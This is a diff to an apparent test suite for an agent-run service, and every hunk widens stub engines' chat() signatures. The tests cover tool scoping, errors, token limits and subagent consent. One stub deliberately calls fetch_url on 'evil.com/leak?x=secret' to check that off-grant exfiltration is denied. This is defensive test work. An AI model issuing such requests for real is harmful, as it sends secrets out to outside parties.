@@ -1130,7 +1130,7 @@ class TestAgentRunRoutes:
             def set_model(self, m): pass
             def set_working_dir(self, d): pass  # v1.19.x: unsealed runs set the default wd
             def enable_tools(self): pass
-            async def chat(self, task, stream=False):
+            async def chat(self, task, stream=False, **_kw):
                 # the route wrapped self.tool_manager in ScopedToolManager;
                 # call a granted tool (emits tool_call with the real
                 # data={"tool": ...} shape), attempt an off-grant tool
@@ -1202,7 +1202,7 @@ class TestAgentRunRoutes:
             def set_model(self, m): pass
             def set_working_dir(self, d): pass  # v1.19.x: unsealed runs set the default wd
             def enable_tools(self): pass
-            async def chat(self, task, stream=False):
+            async def chat(self, task, stream=False, **_kw):
                 # one denied (evil.com), one allowed (api.github.com)
                 await self.tool_manager.execute_tool(
                     "fetch_url", url="https://evil.com/leak?x=secret")
@@ -1272,7 +1272,7 @@ class TestAgentRunRoutes:
             def set_model(self, m): pass
             def set_working_dir(self, d): pass  # v1.19.x: unsealed runs set the default wd
             def enable_tools(self): pass
-            async def chat(self, task, stream=False):
+            async def chat(self, task, stream=False, **_kw):
                 # provider blew up mid-call — engine surfaces it as an event
                 yield Event(
                     type=EventType.ERROR,
@@ -1314,7 +1314,7 @@ class TestAgentRunRoutes:
             def set_model(self, m): pass
             def set_working_dir(self, d): pass  # v1.19.x: unsealed runs set the default wd
             def enable_tools(self): pass
-            async def chat(self, task, stream=False):
+            async def chat(self, task, stream=False, **_kw):
                 for _ in range(n_tool_calls):
                     yield Event(type=EventType.TOOL_CALL, data={"tool": "read_file"})
                 yield Event(type=EventType.STREAM_END, data="done")
@@ -1435,7 +1435,7 @@ class TestAgentRunRoutes:
             def set_model(self, m): pass
             def set_working_dir(self, d): pass  # v1.19.x: unsealed runs set the default wd
             def enable_tools(self): pass
-            async def chat(self, task, stream=False):
+            async def chat(self, task, stream=False, **_kw):
                 for _ in range(10):
                     # tokens accrue BEFORE the boundary check reads them —
                     # exactly as the real engine bumps live_run_tokens.
@@ -2148,7 +2148,7 @@ class TestConsentParkE2E:
             def set_working_dir(self, d):
                 pass
 
-            async def chat(self, task, stream=False):
+            async def chat(self, task, stream=False, **_kw):
                 if self._is_parent:
                     out = await self.tool_manager.execute_tool(
                         "spawn_subagent", task="child job", tools=["read_file"]
@@ -2453,7 +2453,7 @@ class TestDisconnectThenCollectE2E:
             def enable_tools(self):
                 pass
 
-            async def chat(self, task, stream=False):
+            async def chat(self, task, stream=False, **_kw):
                 yield Event(type=EventType.STREAM_END, data="the held answer")
 
         monkeypatch.setattr(task_runner, "EngineClient", lambda: _StubEngine(),
@@ -2892,7 +2892,7 @@ class TestWorkdirAlignment:
             def set_model(self, m): pass
             def set_working_dir(self, d): seen["wd"] = d
             def enable_tools(self): pass
-            async def chat(self, task, stream=False):
+            async def chat(self, task, stream=False, **_kw):
                 yield Event(type=EventType.STREAM_END, data="ok")
 
         monkeypatch.setattr(
@@ -2946,7 +2946,7 @@ class TestWorkdirAlignment:
             def set_model(self, m): pass
             def set_working_dir(self, d): seen["wd"] = d
             def enable_tools(self): pass
-            async def chat(self, task, stream=False):
+            async def chat(self, task, stream=False, **_kw):
                 yield Event(type=EventType.STREAM_END, data="ok")
 
         monkeypatch.setattr(
